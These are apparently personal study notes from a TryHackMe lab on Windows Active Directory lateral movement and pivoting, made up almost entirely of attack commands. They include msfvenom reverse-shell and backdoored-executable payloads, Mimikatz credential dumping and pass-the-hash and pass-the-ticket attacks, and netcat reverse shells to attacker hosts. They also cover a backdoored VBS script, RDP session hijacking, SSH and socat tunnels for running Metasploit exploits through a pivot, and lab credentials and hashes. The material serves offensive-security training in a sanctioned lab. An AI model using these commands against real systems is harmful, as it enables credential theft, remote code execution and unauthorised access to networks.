https://tryhackme.com/r/room/lateralmovementandpivoting

Fix TryHackMe Network DNS
```bash
resolvectl dns lateralmovement 10.200.104.101 #interface and DNS IP
```
### Spawning Processes Remotely
#### PSExec
Port 445/TCP
Required Group Membership: Administrator

The way psexec works is as follows:

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

```powershell
psexec64.exe \\machine_ip -u administrator -p password -i cmd.exe
```

#### WinRM
```powershell
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

or

Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

#### sc Create Services
Ports:
135/TCP, 49152-65535/TCP (DCE/RPC)
445/TCP (RPC over SMB Named Pipes)
139/TCP (RPC over SMB Named Pipes)
Required Group Memberships: Administrators

When using sc, will try to connect to Serv Contr Man (SVCCTL) through RPC
- Attempt using DCE/RPC, connect to Endpoint Man (EPM) port 135, catalog of RPC endpoints, EPM will then respond with IP and port to connect to SVCCTL, usually dynamic port in range 49152-65535
- Attempt to reach SVCCTL through SMB named pipe on 445 (SMB) or 139 (SMB over NetBIOS)
```powershell
sc.exe \\target create thmservice binpath= "net user munra Pass123 /add" start= auto
sc.exe \\target start thmservice

additional verbs: stop, delete
```


Service exe's are different than standard, and will die almost immediately upon execution

```
msfvenom -p windows/meterpreter/reverse_winhttps -f exe-service LHOST=10.50.100.173 LPORT=8080 -o INVISIBLE_PILLOW.exe
```

```bash
smbclient -c 'put INVISIBLE_PILLOW.exe' -U t1_leonard.summers -W ZA '//10.200.104.201/admin$/' EZpass4ever
```

Since we only have SSH access and a runas would just spawn a new terminal in the current GUI session we don't have access to, can just spawn a reverse shell with the credentials.
```powershell
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.100.173 4443"
```

```powershell
sc.exe \\thmiis.za.tryhackme.com create THMService-AD-LAT-49 binPath= "%windir%\INVISIBLE_PILLOW.exe" start=auto

#Windir = C:\Windows\

sc.exe \\thmiis.za.tryhackme.com start THMService-AD-LAT-49
```
#### SchTasks Remotely

```powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to exec>" /sc ONCE /sd 01/01/1970 /st 00:00

/sc - schedule type
/sd - start date
/st - start time

Since system runs the schtask, its a blind attack

Delete Scheduled Task
schtasks /S target /TN "THMtask1" /DELETE /F
```

### WMI
* DCOM
	* DCERPC 135/TCP 49152-65535/TCP, like for sc.exe
* Wsman
	* WinRM - 5985/TCP(WinRM HTTP) or 5986/TCP(WinRM HTTPS)
#### Setup
Powershell Credential
Setup Secure Password Powershell
```powershell
$username = 'Administrator' 
$securePassword = Read-Host -AsSecureString -Prompt 'Enter Password' 
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
```

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName Target -Credential $credential -SessionOpt $Opt -ErrorAction Stop
```

#### Create Remote Process WMI Powershell
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\test.txt -Value bananas";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```
No output of command but will silently create process

Legacy
```powershell
wmic.exe /user:Administrator /password:Password123 /node:TARGET process call create "cmd.exe /c calc.exe"
```
#### Create Remote Service WMI Powershell

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "Service2";
DisplayName = "Service2";
PathName = "net user hacker hacker123 /add"; #payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess; Start service in new process
StartMode = "Manual"
}
```

Start Service

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'Service2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService

Additional Methods: StopService, Delete
```
#### Create Remote SchTask WMI Powershell
```powershell
# Payload must be split command and args
$Command = "cmd.exe"
$Args = "/c net user hacker hacker123 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "ThmTask2"
Start-ScheduledTask -CimSession $Session -TaskName "ThmTask2"

Delete SchTask
Unregister-ScheduledTask -CimSession $Session -TaskName "ThmTask2"
```
#### Install MSI Remotely WMI Powershell

Required Group Memberships: Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

Legacy Systems
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

#### Exercise
```sh
msfvenom -p windows/meterpreter/reverse_winhttps -f msi LHOST=10.50.100.173 LPORT=8080 -o WORD_WORLD.msi

34  use exploit/multi/handler
35  set payload windows/meterpreter/reverse_winhttps
37  set lhost 10.50.100.173
38  set lport 8080
40  set exitonsession false
41  run -j

smbclient -c 'put WORD_WORLD.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

$username = 't1_corine.waters'; 
$securePassword = Read-Host -AsSecureString -Prompt 'Enter Password'; 
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword); 
$Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\WORD_WORLD.msi"; Options = ""; AllUsers = $false}
```

### Alternate Authentication

#### NTLM Auth
![[Pasted image 20241228201220.png]]
If the Windows domain is configured to use NTLM Auth
Can extract NTLM hashes w/ mimi from either local SAM db or from LSASS mem

```bash
Extract local users on machine
mimikatz # privilege::debug
mimikatz # token:: elevate
mimikatz # lsadump::sam

Extract local & domain recently logged on
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv

PtH
mimikatz # token::revert # because trying to PtH w/ elevated wouldn't work
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc.exe -e cmd.exe ATTACKER_IP 5555" 
Equiv of runas /netonly but with hash instead of pass
Whoami will show OG user before PtH, but commands will use creds injected w/ PtH
```

#### Pass-the-Hash Tools
```bash
RDP Pass-the-Hash
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

PsExec (only linux version) Pass-the-Hash
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

WinRM Pass-the-Hash
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```
#### Kerberos Auth

Client sends timestamp enc w/ key derived from password (alg to derive can be DES (disabled by default on current Windows), RC4, AES128, AES256, depending on installed win version and kerb config.) to KDC
KDC sends back TGT, which allows client to req tickets to services w/o giving that service their creds, alongside a Session Key
* TGT enc using krbtgt hash, encrypted TGT includes copy of session key, KDC doesn't need to store session key as it can decrypt TGT if needed
![[Pasted image 20241228202513.png]]
User uses TGT to ask KDC for TGS (Ticket Granting Service) - Grants tickets for connection to only service. User sends username and timestamp enc using the session key, along with the TGT and a Service Principal Name (SPN), indicating service and server name intended to access.

KDC will respond with TGS and Svc Session Key, needed to auth to service. TGS encrypted using Service Owner Hash. Service Owner is user/machine under which service runs. TGS contains copy of Svc Session Key in enc contents so that Service Owner can Access by decrypting TGS.
![[Pasted image 20241228202825.png]]
TGS sent to service to auth and establish conn. Service will use its accounts password hash to decrypt TGS and validate Svc Session Key
![[Pasted image 20241228202839.png]]

#### Pass-the-Ticket

Sometimes if you have SYSTEM you can extract Kerberos tickets and session keys from LSASS mem

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Need both ticket and corresponding session key
Mimikatz can extract any TGT or TGS in LSASS mem, but mostly interested in TGTs since they can be used to request access to any services the user is allowed to access. TGS is only good for specific service. Extracting TGT will require admin creds, and extracting TGS can be done with low-priv account (only ones assigned to that account)

With desired ticket, can inject into current session (injecting doesn't require admin privs)
```powershell
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

after this, tickets will be available for any tools we use for lat movement. if they were injected correctly, you can use the klist command

```
C:\ klist
```

#### Overpass-the-hash (RC4) / Pass-the-key

Similar to PtH but applied to Kerberos

Client sends timestamp enc w/ key derived from password (alg to derive can be DES (disabled by default on current Windows), RC4, AES128, AES256, depending on installed win version and kerb config.) to KDC
If we have any of the keys, we can ask KDC for TGT without requiring actual password.

Obtain Kerb enc keys from memory
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

RC4 Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

AES128 Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

AES256 Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

RC4, key will be equal to NTLM hash of a user. If we can extract NTLM hash, can use it to request TGT as long as RC4 is one of the enabled protocols. (Overpass-the-Hash)

#### Exercise

User: ZA.TRYHACKME.COM\t2_felicia.dean
Password: iLov3THM!
`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`

```
[0;1760f1]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi
```

```powershell
mimikatz # sekurlsa::tickets /export

mimikatz # kerberos::ptt [0;1760f1]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi

.\PsExec64.exe \\thmiis.za.tryhackme.com powershell.exe

or

winrs.exe -r:THMIIS.za.tryhackme.com cmd
```


### Abusing User Behavior

#### Abusing Writable Shares

Check if any remote resources are writable and could be manipulated

#### Backdooring .vbs Scripts

```c
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

#### Backdooring .exe Files

```c
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

Stealth Idea: Replace .exe of service with backdoored version 
```powershell
Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\' | ForEach-Object {
    $props = Get-ItemProperty -Path $_.PsPath
    [PSCustomObject]@{
        ServiceName = $_.PSChildName
        Start       = $props.Start
        DisplayName = $props.DisplayName
        ImagePath   = $props.ImagePath
    }
} | Format-Table -AutoSize
```

#### RDP Hijacking

SYSTEM on 2016 or earlier, takeover without password

PSExec Admin -> System
```cmd
PsExec.exe -s cmd.exe

query user
```

State Disc means they're inactive, Active means you'd kick them out

Specify ID to take over, and current SESSIONNAME
```powershell
tscon 3 /dest:rdp-tcp#6
```

```
Connecting to exercise box

xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
```

### Port Forwarding
https://github.com/twelvesec/port-forwarding
https://iximiuz.com/en/posts/ssh-tunnels/

Attacker machine will act as SSH Server since client will exist on victims but not likely a server

```bash
# Create dummy ssh user account
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

#### SSH Remote Port Forwarding

![[Pasted image 20241229123054.png]]
Remote allows reachable port from client (pivot victim), project it to remote server (attacker)

Powershell port scan test
```powershell
tnc 192.168.1.254 -p 80
```

```shell-session
C:\> ssh tunneluser@ATTACKER -R ATTACKER_PORT:VICTIM:VICTIM_PORT -N
```
-N stops the session from requesting a shell, since /bin/true would kill it

#### SSH Local Port Forwarding

![[Pasted image 20241229123626.png]]
Make any service available on attacker PC and make it available through a port on PC-1, including reverse shells.

```shell-session
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
C:\> ssh tunneluser@1.1.1.1 -L BIND_ADDRESS:ATK_SERVICE_PORT:VICTIM_BIND_ADDR:MEDIARY_SERVICE_PORT -N
```

Since we are opening a port on PC-1, need firewall rule (admin privs)

```cmd
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

#### Socat Port Forwarding

##### Remote
```sh
# Fork option allows multiple conns without closing
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
C:\>socat TCP4-LISTEN:MEDIARY_PORT,fork TCP4:VICTIM_IP:VICTIM_PORT
```
![[Pasted image 20241229124655.png]]

Socat won't forward conn directly to attacker but will open port on PC-1
Needs firewall allowance

```cmd
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

##### Local
![[Pasted image 20241229124714.png]]

```cmd
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```
#### Dynamic Port Forwarding

Great for pivoting through host and establishing several connections to any IP/port wanted

Since don't want to rely on SSH server being on pivot machine, use SSH client (on pivot machine) to establish reverse dynamic port forward

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

SSH server will start SOCKS proxy on 9050

/etc/proxychains.conf

```
[ProxyList]
socks4  127.0.0.1 9050
```

Nmap may not work well with SOCKS and might show altered results

#### Tunnelling Complex Exploits

![[Pasted image 20241229131052.png]]

![[Pasted image 20241229131626.png]]
```sh
C:\> ssh tun@10.50.100.173 -R 8888:thmdc.za.tryhackme.com:80 -L *:62930:127.0.0.1:62930 -L *:62928:127.0.0.1:62928 -N

C:\> ssh tunneluser@ATTACKER_IP -R LOCALIZED_VICTIM_WEB:thmdc.za.tryhackme.com:VICTIM_WEB -L *:SRVPORT:127.0.0.1:SRVPORT -L *:LPORT:127.0.0.1:LPORT -N
```
-L opts Will bind ports on THMJMP2 and tunn any conn back to attacker 

```
user@AttackBox$ msfconsole
48  use rejetto_hfs_exec
49  set payload windows/shell_reverse_tcp
# tells victim to connect back up the chain, will be forwarded by port forwarding
50  set LHOST thmjmp2.za.tryhackme.com 
# specify listener bind addr separately from addr where payload will conn back
51  set ReverseListenerBindAddress 127.0.0.1 
52  set lport 62930
# exploit must host web server, srvhost is bound to attacker, victim will go through the port forwarding chain
53  set srvhost 127.0.0.1
54  set srvport 62928
# RHOSTS is set to localhost and the attacker's local port for the victim service
55  set rhosts 127.0.0.1
56  set rport 8888
57  exploit
58  run
```

#### Other Port Forwarding Tools

SShuttle
Rpivot
Chisel
Hijacking Sockets with ShadowMove
Ligolo-ng